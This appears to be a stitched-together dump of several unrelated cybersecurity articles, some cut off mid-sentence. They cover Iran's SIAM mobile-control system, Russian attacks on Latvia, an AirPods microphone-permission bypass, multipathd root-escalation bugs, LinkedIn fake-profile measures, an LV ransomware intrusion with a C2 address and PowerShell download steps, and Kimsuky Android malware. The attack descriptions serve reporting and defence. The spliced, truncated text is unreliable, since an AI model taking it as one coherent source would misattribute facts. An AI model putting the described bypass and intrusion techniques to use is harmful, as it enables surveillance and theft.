        "text": "THE INTERCEPTALL RIGHTS RESERVED The documents provide an inside look at an Iranian government program that lets authorities monitor and manipulate peoples phones As furious anti-government protestsswept Iran the authorities retaliated with both brute force and digital repression Iranian mobile and internet users reported rolling network blackouts mobile app restrictions and other disruptions Many expressed fears that the government can track their activities through their indispensable and ubiquitous smartphonesIrans tight grip on the countrys connection to the global internet has proven an effective tool for suppressing unrest The lack of clarity about what technological powers are held by the Iranian government one of the most opaque and isolated in the world has engendered its own form of quiet terror for prospective dissidents Protesters have often been left wondering how the government was able to track down their locations or gain access to their private communications tactics that are frighteningly pervasive but whose mechanisms are virtually unknownWhile disconnecting broad swaths of the population from the web remains a favored blunt instrument of Iranian state censorship the government has far more precise sophisticated tools available as well Part of Irans data clampdown may be explained through the use of a system called SIAM a web program for remotely manipulating cellular connections made available to the Iranian Communications Regulatory Authority The existence of SIAM and details of how the system works reported here for the first time are laid out in a series of internal documents from an Iranian cellular carrier that were obtained by The InterceptAccording to these internal documents SIAM is a computer system that works behind the scenes of Iranian cellular networks providing its operators a broad menu of remote commands to alter disrupt and monitor how customers use their phones The tools can slow their data connections to a crawl break the encryption of phone calls track the movements of individuals or large groups and produce detailed metadata summaries of who spoke to whom when and where Such a system could help the government invisibly quash the ongoing protests or those of tomorrow an expert who reviewed the SIAM documents told The InterceptSIAM can control if where when and how users can communicate explained Gary Miller a mobile security researcher and fellow at the University of Torontos Citizen Lab In this respect this is not a surveillance system but rather a repression and control system to limit the capability of users to dissent or protestSIAM gives the governments Communications Regulatory Authority Irans telecommunications regulator turnkey access to the activities and capabilities of the countrys mobile users Based on CRA rules and regulations all telecom operators must provide CRA direct access to their system for query customers information and change their services via web service reads an English-language document obtained by The Intercept Neither the CRA nor Irans mission to the United Nations responded to a requests for commentThe SIAM documents are drawn from a trove of internal materials from the Iranian cellular carrier Ariantel including years of email correspondence and a variety of documents shared between Ariantel employees outside contractors and Iranian government personnel The cache of materials was shared with The Intercept by an individual who claimed to have hacked Ariantel and believed the documents were in the public interest given the ongoing protestsin Iran and the threat SIAM might pose to demonstrators Ariantel did not respond to a request for commentExperts on mobile security and Iranian government censorship say the functionality revealed by the SIAM program poses a clear threat to protesters demonstrating against the government over the past monthThese functions can lead to life-and-death situations in a country like Iran where there is no fair judicial process no accountability and we have a huge pattern of violations of peoples rights said Amir Rashidi an internet security and digital rights expert focused on Iran Using the tools outlined in this manual could not only lead to mass surveillance and violations of privacy it can also easily be used to identify the location of protesters who are literally risking their lives to fight for their basic rightsA sticker that reads Iran The internet is down and they are killing the people is seen on the back of a road sign during a demonstration where hundreds gathered to honor Mahsa Amini and to protest against the Iranian government on Sept 23 2022 in TorontoPhoto Katherine ChengSOPALightRocket via Getty ImagesIranians regularly complain of slowed internet access on mobile devices during periods of protest an abrupt dip in service that makes smartphone usage difficult if not impossible at moments when such a device could be crucial Based on the manuals SIAM offers an effortless way to throttle a phones data speeds one of roughly 40 features included in the program Thisability to downgrade users speed and network quality is particularly pernicious because it can not only obstruct ones ability to use their phone but also make whatever communication is still possible vulnerable to interceptionA sticker that reads Iran The internet is down and they are killing the people is seen on the back of a road sign during a demonstration where hundreds gathered to honor Mahsa Amini and to protest against the Iranian government on Sept 23 2022 in TorontoReferred to within SIAM as Force2GNumber the command allows a cellular carrier to kick a given phone off substantially faster more secure 3G and 4G networks and onto an obsolete and extremely vulnerable 2G connection Such a network downgrade would simultaneously render a modern smartphone largely useless and open its calls and texts to interception both of obvious utility to a government clamping down on public gatherings and speechGenerally speaking forcing a phone to use the 2G network would still allow the phone to receive a two-factor SMS authentication message because SMS is sent over the mobile signaling network explained Miller However the effect of forcing a user onto the 2G network more importantly would essentially render the corresponding real-time application services such as P2P communication social media and internet uselessMiller pointed out that the target of a 2G downgrade might experience the attack as little more than spotty cell reception It can be viewed as a method to appear as if the network is congested and severely limit a users data services Miller saidSlowing connectivity is only one of many telecom tools available to Ariantel and the CRA that could be used to monitor political dissent SIAM also provides a range of tools to track the physical locations of cell users allowing authorities to both follow an individuals movements and identify everyone present at a given spot Using the LocationCustomerList command allows SIAM operators to see what phone numbers have connected to specified cell towers along with their corresponding IMEI number a unique string of numbers assigned to every mobile phone in the world For example Miller said if there is a location where a protest is occurring SIAM can provide all of the phone numbers currently at that locationSIAMs tracking of unique device identifiers means that swapping SIM cards a common privacy-preserving tactic may be ineffective in Iran since IMEI numbers persist even with a new SIM explained a network security researcher who reviewed the manuals and spoke on the condition of anonymity citing their safetySIAMs location-tracking power is particularly alarming given the high-stakes protests taking place across Iran The Intercept reviewed undated text messages sent to Iranian mobile phone users from local police in the city of Isfahan informing them that they had been confirmed to have been ina location of unrest and warning them not to attend in the future Many Iranian social media users have reported receiving similar messages in recent weeks warning them to stay away from the scene of protests or from associating with anti-revolutionary opponents of the government onlineArmed with a list of offending phone numbers SIAM would make it easy for the Iranian government to rapidly drill down to the individual level and pull a vast amount of personal information about a given mobile customer including where theyve been and with whom theyve communicated According to the manuals user data accessible through SIAM includes the customers fathers name birth certificate number nationality address employer billing information and location history including a record of Wi-Fi networks and IP addresses from which the user has connected to the internetWhile much of Irans surveillance capacity remains shrouded in mystery details about the SIAM program contained in the Ariantel archive provide a critical window into the types of tools the Iranian government has at its disposal to monitor and control the internet as it confronts what may be the greatest threat to its rule in decadesThese documents prove something that we have long suspected which is that even devices that use encryption for messaging are still vulnerable because of the nature of internet infrastructure in Iran said Mahsa Alimardani a senior researcher with the internet freedom organization Article19 Security measures like two-factor identification using text messages still depend on telecommunications companies connected to the state Average internet users are forced to connect through nodes controlled by these companies and their centralization of authority with the government makes users vulnerable to insidious types of surveillance and controlPeople gather during a protest for Mahsa Amini who died after being arrested by morality police for allegedly not complying with strict dress code in Tehran Iran on Sept 19 2022Photo StringerAnadolu Agency via Getty ImagesThe latest round of protests in Iran kicked off in mid-September after a young woman named Mahsa Jina Amini was killed while in the custody of the countrys notorious morality police following her arrest for wearing her mandatory head covering improperly While the movement originated with women opposing the brutality of hijab enforcement anti-government outrage quickly spread among Irans youth from universities to secondary schools across the country The governments crackdown took a variety of shapes including brute force with security services in riot gear squaring off with demonstrators in the street and a quieter effort to shut down civilian communicationsPeople gather during a protest for Mahsa Amini who died after being arrested by morality police for allegedly not complying with strict dress code in Tehran Iran on Sept 19 2022The Iranian government has long viewed internet freedom as a national security issue and has taken steps to securitize Iranians online access As in the United States where the National Security Agency has used government secrecy and legal coercion to turn the telecom and data sectors into intelligence-gathering tools the Iranian state compels communications networks to give the government access through required hardware and software In Iran where the autocratic reach of central government leadership touches nearly every aspect of the state without even superficial democratic oversight the powers afforded by this integration are far greater and far more draconian in consequencePart of this effort has included directly assigning Iranian intelligence personnel to government bodies tasked with internet regulation like the CRA The Article 19 report notes the close personnel relationship between the CRAs OSCS division and Irans Ministry of IntelligenceThough Iranians have complained of slowed data connections and total internet blackouts at times the telecom crackdown has consequences beyond losing ones connection Demonstrators have reported visits from government authorities at their homes where the agents were armed with specific knowledge of their whereabouts and activities such as when they were using their phones to record videoWhile some of what SIAM does is benign and required for administrating any cellular network Miller the Citizen Lab researcher explained that the scope of the system and the Iranian governments access to it is not While most countries allow law enforcement and security agencies to legally obtain intercept and analyze cellular communications the surveillance and control powers afforded by SIAM are notable in their scale and degree said Miller The requests by CRA go well beyond traditional lawful intercept requirements at least in non-repressive countriesSIAM allows its operators to learn a great deal not just about where a customer has been but also what theyve been up to a bounty of personal data that Miller said can enable CRA to create a social networkprofile of the user based on hisher communication with other peopleBy entering a particular phone number and the command GetCDR into SIAM a system user can generate a comprehensive Call Detail Record including the date time duration location and recipients of a customers phone calls during a given time period A similar rundown can be conducted for internet usage as well using the GetIPDR command which prompts SIAM to list the websites and other IP addresses a customer has connected to the time and date these connections took place the customers location and potentially the apps they opened Such a detailed record of internet usage could also reveal users running virtual private networks which are used to cover a persons internet trail by routing their traffic through an encrypted connection to an outside server VPNs including some banned by the government have become tremendously popular in Iran as a means of evading domestic web censorshipThough significantly less subtle than being forced onto a 2G network SIAM can also be used to entirely pull the plug on a customers device at will Through the ApplySuspIp command the system can entirely disconnect any mobile phone on the network from the internet for predetermined lengths of time or permanently Similar commands would let SIAM block a user from placing or receiving callsRashidi the internet security expert said participants in the recent demonstrations as well as Iranians living near scenes of protest have reported internet shutdowns targeting their mobile devices that have downgraded phones to 2G access particularly during the late afternoons and evenings when many demonstrations occurRashidi said the widespread use of VPNs in Iran represents another vulnerability the SIAM system could exploit The program makes it possible to check particular IP addresses against particular VPNs and thereby deduce the identities and locations of the users accessing them The government can easily identify IP addresses in use by a particular VPN provider pass the addresses to this location function and then see where the people are who are using this VPN said RashidiAlthough the documents dont mention SIAMs use against protesters or any other specific target Miller said the functionality matches what hes observed in this and other digital crackdowns in Iran CRA has defined rules and regulations to provide direct access to mobile operators system and SIAM is a means to this end he said If all telecom operators in Iran are required to provide the CRA with SIAM or similar direct access they could in effect have complete control over all user mobile communications throughout the country Controlling user communications is a massive violation of basic and fundamental human rightsSimona FoltynIsraels war on Gaza unites Hezbollah Hamas the

        "text": "Russian cyberattacks may be a global threat but Ukraine's allies have been especially at risk Among them is Latvia which was one of the first to declare Russia a state sponsor of terrorism and stopped issuing entry visas to Russian citizens in AugustBefore Russia invaded Ukraine in late February most cyberattacks targeting Latvian organizations were financially motivated but now the countrys cybersecurity agencies have to deal with more serious threats pro-Russian hacktivists and nation-state hackers targeting the government critical infrastructure and private businessesSince the beginning of the war in Ukraine the number of cyberattacks in Latvia has increased by more than 30 Varis Teivans the deputy manager of Latvias Computer Emergency Readiness Team CERT told The RecordWhat hackers are actually achieving however is less clear Cyberattacks by pro-Kremlin hacktivist groups like Killnet usually achieve nothing more than publicity although Teivans does admit the activity of state-backed hackers is a cause for concernThe Record visited Teivans at CERT's office in the Latvian capital of Riga this month to talk about the new challenges Russias war with Ukraine poses for Baltic cyberspaceThe cyberattacks that attract the most media attention in Latvia are usually carried out by pro-Kremlin hacktivists including Killnet and its affiliates like XakNet and FuckNet according to TeivansThey usually conduct distributed denial-of-service DDoS attacks flooding websites with junk traffic to knock them offline or post threatening messages on the main page of the websites in whats known as defacement attacksMost of these are successfully countered by Latvian cybersecurity specialists and those that hit the targets have no lasting impact according to TeivansHacktivists often attack in response to specific events according to Teivans Latvia designated Russia a state sponsor of terrorism shortly before the DDoS attack on the parliament websiteIn July pro-Kremlin hacktivists attacked Latvian computer systems almost daily outraged by the Latvian government's decision to demolish nearly 300 Soviet monumentsWhat they've achieved was to disrupt some of the public transport ticketing services and a charity that collects donations for people in need Teivans said This is a very bad performanceAccording to Teivans Russian hacktivists have a poor understanding of what they are targeting Once they attacked the website of a now-closed Latvian airport and mistakenly hacked the Latvian agency responsible for parks and recreation confusing it with the Ministry of the InteriorRussian hacktivists are a PR project not talented hackers Teivans said Every time they claim to have hacked some of our websites and leaked information its a lie sometimes a very pathetic oneFuckNet for example once claimed to have hacked the website of President Egils Levits and stolen data which it turned out was publicly-available procurement informationThere are however more sophisticated cyber operations conducted by capable Russian hackers the so-called advanced persistent threat APT groups These are the attacks we are most concerned about Teivans saidAmong APTs most common targets are state services critical infrastructure facilities and businesses that work with the government Private businesses are compromised to gain access to more secure government networks Teivans saidThe same hacker groups that have targeted Ukraine have tried to compromise Latvia's telecommunication and energy infrastructure Teivans added though he said he couldnt disclose the names of the groups or the impact these attacks had due to security reasonsIn September the Ukrainian government warned that Russia plans to increase the intensity of DDoS attacks on the critical infrastructure of Ukraines closest allies including the Baltic countriesCarefully-planned cyberattacks on the right targets could increase the effect of missile strikes on electrical supply facilities according to Ukrainian intelligenceTeivans agreed that Russian hackers could intensify their attacks on Europe's energy sector and some critical infrastructure In fact they may have been preparing for these attacks for monthsAPT operations are not opportunistic Teivans said Nation-state hackers usually sit in critical networks for a while waiting for a perfect moment to attackLatvia was a common target for Russian hackers even before the start of the war in Ukraine said Teivans who has worked at CERT since its inception in 2007With the beginning of the war in Ukraine Estonia and Lithuania were also increasingly attacked by Russian hackersLike its Baltic neighbors Latvia was formerly part of the Soviet Union and still has a large Russian-speaking minority But its government actively supported Ukraine in the war against Russia sending weapons sheltering Ukrainian refugees and supporting sanctions against the Kremlin Since extending that support the number of cyberattacks on Latvia has increased significantlyTo counter these threats the country has two CERTs one responsible for Latvia's cyberspace with a focus on government computer systems and critical infrastructure and the other for the protection of military networksBoth of them are subordinate to Latvia's Ministry of Defense which Teivans says is a big advantage The MOD is committed to cybersecurity and heavily supports it legislatively and with funding he saidAlthough Latvia is preparing for Russian attacks Teivans doesnt think that they will be struck in the same way as Ukrainian targetsWe are still at a stage where kinetic warfare is a priority for the attacking nation while cyber is only a tool for threat actors to gain some economic and political advantage or a means to support kinetic operations he told The RecordDaryna Antoniukis a freelance reporter for Recorded Future News based in Ukraine She writes about cybersecurity startups cyberattacks in Eastern Europe and the state of the cyberwar between Ukraine and Russia She previously was a tech reporter for Forbes Ukraine Her work has also been published at Sifted The Kyiv Independent and The Kyiv Post

        "text": "TLDR Any app with access to Bluetooth could record your conversations with Siri and audio from the iOS keyboard dictation feature when using AirPods or Beats headsets This would happen without the app requesting microphone access permission and without the app leaving any trace that it was listening to the microphoneOne of the biggest myths when it comes to security and privacy on mobile devices is the old saying that Facebook is using your device's microphone to listen to everything you say in order to sell more targeted ads There's never been any evidence of that and iPhones have very strong security measures in place to prevent such a thingThis section might be too basic for folks who are already familiar with how this stuff works under the hood feel free to skip itThe system that protects you from unfettered access to your sensitive data on Apple's operating systems is TCC Transparency Consent and Control which is directly responsible for most of the permission prompts you see when an app asks to access your location calendar microphone camera etcAccess to system resources is mediated with the use of daemons which are system processes that run in the background many times with elevated privileges when compared to regular apps Apps can then request information from those daemons effectively opening a little door from their sandbox to the outside worldThose doors are usually very tightly controlled on Apple's platforms with the use of code signing and entitlements Out of the box modern Apple devices will only run apps with a code signature that's been approved by Apple You can think of a code signature of an app as the equivalent of a government-issued ID where the government is Apple Entitlements are like licenses little bits of information that have also been verified by Apple and can give apps access to system resources that are normally not accessibleAll of these protections can be quite effective However their effectiveness relies heavily on how well Apple's engineers have implemented them in the system daemons and sometimes unforeseen workarounds can result in a situation where the door has been very well shut and secured but the window has been left wide openSince the introduction of the H1 chip with the AirPods 2nd generation users can trigger Hey Siri with AirPods and talk to the assistant without much effort and then receive a reply in the form of here's what I found on the web One thing you may or may not have noticed if you've used Siri with modern AirPods is that there's no disruption to audio quality when you're talking to Siri even though you're using the microphone in the AirPods to do so This is very different from when you're using it for a video conference for example where you'll notice a significant drop in the output audio qualityI always wondered why that was the case Knowing that the drop in output quality when using the microphone is a physical limitation of the Bluetooth standards used by AirPods and other similar headsets how talk to Siri had been implemented on AirPods without disrupting audio quality had always been a bit of a mystery to me but I never put much thought or effort into figuring that outI'm a fan of creating tools that make my job easier so a while back I wrote a little command-line tool that I call bleutil which can be used to interact with Bluetooth Low Energy devices on macOS I use it all the time to debug what's going on with my AirPods by looking at the advertisement packets they're sending outWhile working on a new feature for this tool which can be used to connect to a Bluetooth LE device and query its GATT database I decided to add the ability to subscribe to notifications to a service's characteristics using this tool which would then stream a hexadecimal representation of the values over time to the Terminal window If you're not familiar with Bluetooth Low Energy terminology GATT stands for Generic Attribute Profile It's a standard adopted by Bluetooth LE devices that allows them to send data back and forth using services and characteristics You can think of services as folders on a file system where each service can have a bunch of characteristics within it which are like filesI had never looked into the services and characteristics present on AirPods and similar devices because most of the information I use to power AirBuddy's features comes from advertisements or Bluetooth Classic which don't require me to connect to the devices over Bluetooth LE and interact with the GATT databaseNaturally while testing this new feature I was working on I was wearing my AirPods I noticed that the AirPods included a service with the UUID 9bd708d7-64c7-4e9f-9ded-f6b6c4551967 and with characteristics that supported notifications I ran my tool against my AirPods and left it running for a while but no events came through In Bluetooth LE GATT when a characteristic supports notifications or indications it means that other devices can subscribe to be notified when the data stored by that characteristic changes without having to be constantly asking polling for the current data It's essential for real-time communication between devicesDigging a bit into it I learned that 9bd708d7-64c7-4e9f-9ded-f6b6c4551967 is the DoAP service a service used for Siri and Dictation supportI decided to test it again This time while my tool was running and waiting for events to come from the AirPods I invoked Siri while wearing them As soon as I did that a firehose of hex bytes started to stream down my Terminal window Not only that but as I spoke to Siri through my AirPods I noticed that the bytes would change rapidly and would settle down as I went silent again Could it be that I was looking at audio data You can watch a reproduction in the video belowAs it turns out I was in fact looking at audio data coming from the AirPods My first thought was oh so that's how they do it this is cool My second thought was oh noI always have mixed feelings when I discover something like this a mix of excitement for having found a cool new thing to investigate and learn from and disappointmentconcern that this issue has been there in the wild sometimes for yearsFinding out that I could get audio from AirPods without asking for permission to use the microphone on macOS was the first stepThe second step was checking Apple's other platforms to see if they were also affected So I wrote a little app that I could run on iPhone iPad Apple Watch and the Apple TV then tried it out on devices running both the shipping version of iOS 15 and the latest iOS 16 beta at the time this happened in late AugustThe third step was figuring out what the audio data was I was definitely seeing a bunch of bytes coming in but who knows maybe they were encrypted or something The seemingly direct correlation between me speaking to Siri and the bytes changing had already made me think they weren't but I had to confirm itI know a little bit about how digital audio works but it's definitely an area I've had very little experience in throughout my career in software development limiting myself to using high level APIs such as Apple's AVFoundation whenever I have to deal with audio or videoI did notice with some combinations of parameters that the garbled mess I was hearing did vaguely match the loudness of what I had said during the recording which again told me the data was likely unencryptedIn hindsight I should've realized that it wouldn't make any sense for the audio being sent over Bluetooth LE to be uncompressed given the bandwidth constraints of the technology Now all I had to do was figure out which codec was being used then I'd be able to decode the audio and play it backOpus is unmatched for interactive speech Well sounds a lot like the sort of thing you'd use for talking to digital assistantsSo I compiled the Opus library for all of Apple's platforms then wrote a little app that would connect to the AirPods and keep the connection open in the background listening to notifications and audio dataIt sounds simple but the paragraph above comprises several hours of work almost a full day after which I had thisHere's a summary of what the app doesIn a real-world exploit scenario an app that already has Bluetooth permission for some other reason could be doing this without any indication to the user that it's going on because there's no request to access the microphone and the indication in Control Center only lists Siri Dictation not the app that was bypassing the microphone permission by talking directly to the AirPods over Bluetooth LE Yes even though this exploit bypasses the microphone permission it still needs access to Bluetooth so that permission is not bypassed However most users would not expect that giving an app access to Bluetooth could also give it access to their conversations with Siri and audio from dictation And as you'll see in the following paragraphs I was also able to find a way around the Bluetooth permission on macOSIn the course of figuring out how things work for my report on the vulnerability described above I had to investigate how Apple's operating systems communicate with the AirPods which led me to discover another issueThe system process responsible for handling of the DoAP protocol on Apple's platforms is BTLEServerAgent or BTLEServer depending on the platform This agent or daemon provides an interface over the mach service comappleBTLEAudioControllerxpc which other processes on the system can use to request audio from the AirPods DoAP serviceThere are hundreds if not thousands of mach services exposed by system agents and daemons on Apple's operating systems but sandboxing restrictions and entitlement requirements prevent most apps from talking to themFor services that are exposed to third-party apps system daemons usually check for a specific entitlement before allowing an app to send requests to them or put up a TCC prompt on the app's behalf only allowing the communication to go through once the user has approved itSo at least on macOS apps would be able to record your conversations with Siri or dictation audio without any permission prompts at all Even worse this particular exploit would also allow the app to request DoAP audio on-demand bypassing the need to wait for the user to talk to Siri or use dictationHere's a demo of this in actionOnce again these issues show that no matter how private and secure Apple's products and software can be there's always more work to be doneNovember 9 2022 - Update The original version of this article mentioned a bug bounty payment of US7000 However this was due to an issue with the way Apple's security team had communicated about the bounty They broke down the two vulnerabilities discovered into separate CVEs one of which was awarded a bounty of US7000 while the other one was awarded US22500 So the total bounty payment for the bugs described in this report was of US29500 Apple's security team apologized for the confusion and has since released a new web platform for bug submissions which should make this a lot better going forwardWhen I first published this writeup I hadn't included details about the mitigations Apple has put in place for the issues discussed because to be honest they're not that interesting Since a few folks have asked for details on this here they areThe main issue direct access to AirPods DoAP over BLE GATT was addressed by restricting access to the service Even though AirPods and iPhones Macs etc are standard Bluetooth devices Apple has a system in place to limit which services third-party apps can access so they just added the DoAP service to that deny listFor the second issue talking to BTLEServerAgent on macOS the system agent now correctly checks that the calling process has the comapplebluetoothsystem entitlement before allowing communication to continue This is the same entitlement that also opens up access to those forbidden GATT servicesNow if an app attempts to talk to the agent without the appropriate entitlement it closes the connection then logs a passive-aggressive message to the consoleGuilherme Rambo writes about his coding and reverse engineering adventures"

recommends security teams apply patches for these vulnerabilities as soon as possibleThe Qualys Research Team combined these two vulnerabilities with the third vulnerability in another package installed by default on Ubuntu Server and obtained full root privileges on Ubuntu Server 2204 other releases are probably also exploitable We will publish this third vulnerability and the complete details of this local privilege escalation in an upcoming advisory next monthThe multipathd daemon oversees checking for failed paths When this happens it will reconfigure the multipath map the path belongs to so that this map regains its maximum performance and redundancy The multipathd daemon runs as a root in the default installation of Linux Operating Systems like Ubuntu ServerSuccessful exploitation of the three vulnerabilities allows any unprivileged user to gain root privileges on the vulnerable host Qualys security researchers have independently verified the vulnerability developed an exploit and obtained full root privileges on default installations of UbuntuAs soon as the Qualys Research Team confirmed the vulnerability we engaged in responsible vulnerability

you can track the vulnerability exposure within your organization and view your impacted hosts their status distribution across environments and overall management in real-time allowing you to see your MTTR Leeloo Multipath DashboardNo Not at this timeNoNo But if an attacker can log in as an unprivileged user the vulnerability can be quickly exploited to gain root privilegesThis is a punreference to Leeloo Multipass which is actually related to authentication and authorization from the movie The Fifth ElementAn attacker who has unprivileged access to an unpatched Linux system can exploit these vulnerabilities to obtain full root privileges ie this is a Local Privilege Escalation to administrator privilegesThe first vulnerability is an authorization bypass CVE-2022-41974 that allows an unprivileged attacker to trigger the second vulnerability a symlink attack CVE-2022-41973 This allows the attacker to create files and directories in arbitrary places of the filesystemTo the best of our knowledge these two vulnerabilities are not powerful enough to lead to full root privileges on their own However we were able to combine them with a third vulnerability that we discovered in another package and obtained full root privileges on Ubuntu ServerWe will publish this third vulnerability and hence this complete exploit chain of these three otherwise unexploitable vulnerabilities in an upcoming advisoryNo not urgently since this is a Local Privilege Escalation that to the best of our knowledge requires an additional vulnerability to be successfully exploited Nonetheless since this additional vulnerability will become public in a few weeks the multipathd vulnerabilities should be patched as part of a normal patch management life cycleTo the best of our knowledge noThese vulnerabilities affect all Linux distributions multipathd is a common Linux daemon especially on servers For example our complete exploit chain targets the default installation of

        "text": "LinkedIn has introduced three new features to fight fake profiles and malicious use of the platform including a new method to confirm whether a profile is authentic by showing whether it has a verified work email or phone numberOver the past couple of years LinkedIn has become heavily abused by threat actors to initiate communication with targets to distribute malware perform cyberespionage steal credentials or conduct financial fraudToday LinkedIn announced that it has begun to display more information about accounts to verify their authenticity actively hunt for fakes using AI and warn users when they receive suspicious messagesThe first step to fighting fake accounts on LinkedIn is introducing a new About this profile section that gives users information like when the user created their profile if the holder has verified their number and if they linked a work emailIf a cybercriminal was to use a fakeimpersonated account to approach a target on LinkedIn they'd have to invest unrealistic amounts of time maintaining and operating a fake account that has a believable creation dateAlso having no access to a corporate email from the impersonated company it would be challenging for threat actors to validate their accounts as authenticThe second step is to use AI to catch accounts using AI-generated images as profile photos to give a false sense of authenticity which is a clear sign of fraudulent activityLastly LinkedIn now displays warnings when a chat participant proposes to take communications outside the platformIn most of these cases the victims are convinced to download an IM clone which installs a modified version of a communication app along with spywareOnly time will tell if these safety features will prove adequate to stop bad actors from abusing LinkedIn but the targeted measures the platform introduced should make hackers' operations much harder"

entry provides a look at an attack involving the LV ransomware on a Jordan-based company from an intrusion analysis standpointBy Mohamed Fahmy Sherif Magdy Ahmed SamirOctober 25 2022Read time wordsSave to FolioIn this blog entry we will provide details on a recent intrusion performed by a group affiliate that involved the compromise of the corporate environment of a Jordan-based company In this incident the attackers used the double-extortion technique to blackmail their victims threatening to release allegedly stolen data in addition to encrypting the victims filesIn December 2021 we observed a post on a cybercrime forum from a malicious actor claiming to operate the LV ransomware and seeking network access brokers The malicious actor expressed interest in obtaining network access to Canadian European and US entities and then monetizing them by deploying the ransomwareReported LV ransomware breaches have been increasing since the second quarter of 2022 which aligns with the malicious actors efforts to expand its affiliates program The chart shown in figure 3 illustrates this increase in activityBased on data from Trend Micro Smart Protection Network and other internal sources Europe was the region with the highest number of breach alerts while the US and Saudi Arabia were the countries with the highest number of reported incidents caused by the ransomware payload The attacks spanned multiple industry verticals with manufacturing and technology being the most affected industries demonstrating the groups opportunistic approachThis section details the tools tactics and procedures TTPs used by the affiliate that infiltrated one of the targeted victims environments as observed from an incident response viewpointThe attacker then executed a persistent malicious PowerShell code that was used to download and execute another PowerShell backdoor file in the server from the malicious IP address 18582219201 as shown in Figure 7The same IP address that hosted the malicious PowerShell code was also found serving a tunneling tool that we believe was used for data exfiltrationBased on our analysis of the Internet Information Services IIS access logs on the infected Exchange servers the following IP addresses were exploiting the Proxyshell vulnerability during the same timeframe as the intrusionFor the credential access and lateral movement phases the attackers used Mimikatz to dump credentials while NetScan and Advanced Port Scanner were used for discovery Based on the event logs collected from one of the infected Exchange servers there were many successful logins using compromised user accounts a day before the ransomware infection occurred on September 8 2022Once the attacker gained access to the domain controller via remote desktop protocol RDP using the compromised account of the domain administrator the ransomware samples were dropped on the server and a malicious group policy containing a malicious scheduled task was created on Sep 9 2022 to execute ransomware from the shared folder hosted on the Domain Controller serverThe domain controller server was used by the attackers to create a malicious group policy object GPO on Sep 9 2022 The GPO then created a malicious scheduled task that ran the malicious batch files 1bat and installbat to deploy the ransomware on the rest of the machines that are connected to the domain controller The batch file installbat was used to disable the security agent services found on the targeted machinesAfter deploying the ransomware the attacker deleted the scripts folder that contained the malicious file samplesThe dropped ransom note showed that the files were encrypted with the l7dm4566n extension on the specific machine we analyzedThe PowerShell command executed after the Microsoft Exchange exploitation is responsible for downloading and executing another PowerShell script from the command-and-control CC server 18582219201 The downloaded PowerShell will be executed directly from memory to bypass detectionThe packed executable stores the LV ransomware binary as an RC4-encrypted data within a section named encAfter unpacking the new payloads and comparing them to the old payloads from the previous research we determined that both payloads were identical indicating that the threat actor behind the LV ransomware did not enhance the main capabilities of their payload but instead expanded the affiliate programs as shown in the first section The similarity results between both samples shown in Figure 25 indicate that both have the same capabilitiesBy partnering with threat actors that have access to networks via the underground the LV ransomware has been able to target multiple regions and industries This development shows that the impact of a ransomware variant is not solely reliant on the addition of new capabilities but also on other factors such as a greater reach and better distribution networksRansomware operators commonly employ vulnerability exploitation techniques as part of their routines Organizations should consider allocating enough resources into regularly patching and updating their infrastructure and software especially if it involves addressing major vulnerabilities such as ProxyShell Furthermore regular auditing and taking inventory of assets and data helps ensure that enterprises are up to date on what is happening within their system Finally implementing data protection backup and recovery measures ensures that data is not lost even if a successful ransomware infection occursA multilayered approach can help organizations guard all possible entry points into the system for endpoints emails web and networks Security technologies that can detect malicious components and suspicious behavior that

        "text": "S2W BLOG--ListenShareAuthor Sebin Lee Yeongjae Shin S2W TALONLast Modified Oct 24 2022 Be careful not to open phishing pages on mobile Be careful not to download a viewer program and document files from third parties and anyoneNorth Korean hacking group Kimsuky aka Thallium Black Banshee first became active in 2012 and has carried out attacks on targets engaged in Media Research Politics and Diplomacy etc around the world The group mainly attempts to collect by distributing malware and taking over accounts through spear-phishing attacks Attacks have mainly targeted Windows though instances of attacks on Android devices have likewise been discoveredS2Ws threat research and intelligence center Talon recently identified three new types of malware that target Android devices in the process of tracking the Kimsuky group We named the three malicious APKs FastFire FastViewer and FastSpy by adding Fast included in the package name of each malicious APK and the characteristics of eachAnalyzing the IP of the CC server domain used by the Kimsuky group in the past we found a suspected malicious APK that the Kimsuky group is developing to target mobile devices It is named FastFire as its package name contains fastsecure and uses the Firebase for CC communicationThe malicious APK has a package name comviewerfastsecure and disguises Google Security Plugin After installation it hides its launcher icon so that the victim does not know that it is installedFastFire contains five malicious classes After installation only three classes are actually executed and two classes are not FastFire transmits a device token to the CC server and then the CC server sends a command to the infected device through Firebase Cloud Messaging FCM1 Request a permissionWhen FastFire is executed MainActivity class is executed first and You must grant permission to the Google Security Plugin in order to be safely downloaded message is displayed and the MANAGEOVERLAYPERMISSION permission is requested If permission is granted the message Downloaded safely is displayed2 CC Communication in ServicesIn the manifest file in FastFire two classes are specified to be executed as services Of these only the MyFirebaseMessagingService class is actually executedThe StartModuleService class is specified on the manifest but it is not actually executed when FastFire is running This class performs the function of reading a specific HTML page through the Android VIEW indentstartmodule class is not in the manifest nor is it called by another class but a malicious code is implemented Kimsuky group conducts phishing attacks disguised as the site to hijack the accounts of large Korean portal sites such as Naver and Daum FastFire malware also targets the two portal sites If the string naver daum or facebook exists in the value received as an argument when calling the startmodule class it connects to the CC server and gets an HTML page As that class is not actually called it is likely still in developmentFirebase is a mobile development platform that provides various necessary functions such as DB authentication and messaging Using this message payloads can include a notification property that the Firebase SDKs intercept and attempt to display a visible notification to usersMyFirebaseMessagingService class performs malicious behaviors by receiving commands through Firebase Cloud Messaging FCM FastFire generates a device token to use FCM and the token value is transmitted to the CC server After obtaining the token the attacker makes a request to Firebase to send a message payload containing the attackers command to the infected device In response to the request Firebase sends a message to the deviceWhen the command is received the onMessageRecived method is executed to perform an action If the data of mycustomkey exists in the message FastFire reads an HTML file from the CC server and connects the deep link that takes the user to a specific page in an app The HTML file according to whether the value is naver daum or facebook3 Additional CC Server and Malicious PagesAfter further analysis of FastFires infrastructure an additional domain assigned to the Resolved IP of FastFires CC server was discovered Since the domain has specific HTML files in the same directory path as FastFires it is also identified as another CC server used by KimsukyThe HTML file obtained from the additional CC server performs the function of calling a specific application through a deep link on an Android device FastFire takes the user to a specific page in an app using the deep link according to the command but the values in the secured HTML were all unidentified The attacker is expected to fill in that value with a test APK name Targethost or a random string for the testGenerally the notification sent from Firebase is handled with the onMessageReceived method However the feature is not performed as the method is not implemented Also in a separate function for testing notifications related messages Facebook and Google are included in TurkishIn addition a file fcmhtml was secured and it calls the fcmhost through the deep link and downloads additional malicious codeAs such FastFire is believed to be a new mobile malware currently being developed by the Kimsuky group in that the deep link calling function is not yet properly implemented and there are classes that are not actually executedIn addition to FastFire we discovered mobile RAT that impersonates the Hancom Office Viewer Hancom Office Viewer is a mobile 